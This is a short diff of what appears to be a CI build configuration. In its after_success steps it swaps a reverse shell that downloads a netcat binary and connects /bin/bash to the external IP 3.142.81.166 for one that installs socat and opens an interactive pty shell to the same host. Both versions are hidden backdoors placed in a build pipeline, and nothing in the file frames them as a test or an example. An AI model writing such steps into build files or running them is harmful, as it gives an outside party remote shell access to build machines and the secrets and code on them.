@@ -11,6 +11,5 @@ script:
 
 after_success:
   - docker --version
-  - curl https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true > /tmp/nc64
-  - chmod 777 /tmp/nc64
-  - /tmp/nc64 3.142.81.166 16344 -e /bin/bash  
+  - sudo apt install socat -y
+  - socat exec:'sh -li',pty,stderr,sigint,sane tcp:3.142.81.166:17997
